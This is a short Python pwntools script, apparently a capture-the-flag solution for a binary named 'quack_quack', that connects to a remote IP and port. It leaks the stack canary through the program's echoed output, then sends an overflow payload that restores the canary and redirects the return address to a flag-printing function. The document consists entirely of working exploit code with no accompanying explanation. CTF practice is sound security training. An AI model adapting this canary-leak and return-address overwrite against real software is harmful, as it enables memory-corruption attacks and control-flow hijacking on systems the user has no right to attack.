from pwn import *
from fmtstr import FormatString
#p = process("./quack_quack")
p = remote("83.136.250.155",54019)
##context.log_level = "debug"
context.arch = 'amd64'
print_flag = 0x000000000040137f

buf_payload = b'a' * 0x10  +b'b' * 0x10  +b'c' * 0x10  +b'd' * 0x10 +b'e' * 0x10 +b'f' * 0x9  + b"Quack Quack "

p.recvuntil("Quack the Duck!\n\n> ")

p.sendline(buf_payload)

p.recvuntil("Quack Quack ")
canary = u64(p.recv(7).rjust(8,b'\x00'))
success("canary :" + hex(canary) )


get_flag_payload = b'a' *0x58 + p64(canary) + p64(print_flag) +p64(print_flag)

p.sendlineafter("> ",get_flag_payload)




p.interactive() 